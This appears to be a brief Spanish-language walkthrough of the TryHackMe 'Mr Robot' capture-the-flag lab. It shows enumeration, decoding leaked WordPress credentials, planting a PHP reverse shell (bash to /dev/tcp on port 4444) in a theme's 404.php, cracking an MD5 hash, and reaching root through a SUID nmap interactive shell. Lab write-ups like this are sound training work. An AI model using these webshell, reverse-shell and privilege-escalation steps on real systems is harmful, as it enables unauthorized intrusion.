# Mr Robot CTF - TryHackMe
**IP:** 10.66.131.162

## Enumeración
```bash
nmap --script http-enum <ip>   # WordPress 4.3.1
```
`robots.txt` filtra `key-1-of-3.txt` y el diccionario `fsocity.dic`.

## Foothold - fuerza bruta WordPress
Deduplicamos el diccionario para acelerar el brute force:
```bash
sort fsocity.dic | uniq > fs_mod.dic
```
En `/license` hay un base64 con credenciales:
```bash
echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
# elliot:ER28-0652
```
Entramos a `wp-admin` y editamos el `404.php` del theme con un reverse shell PHP:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<mi_ip>/4444 0>&1'"); ?>
```
Shell como `daemon`.

## User - hash del usuario robot
```bash
cd /home/robot
cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b  →  abcdefghijklmnopqrstuvwxyz
su robot        # key-2-of-3
```

## Escalada - SUID nmap (modo interactivo)
```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/nmap  (versión vieja, modo interactivo)
nmap --interactive
nmap> !sh
whoami          # root  →  key-3-of-3
```
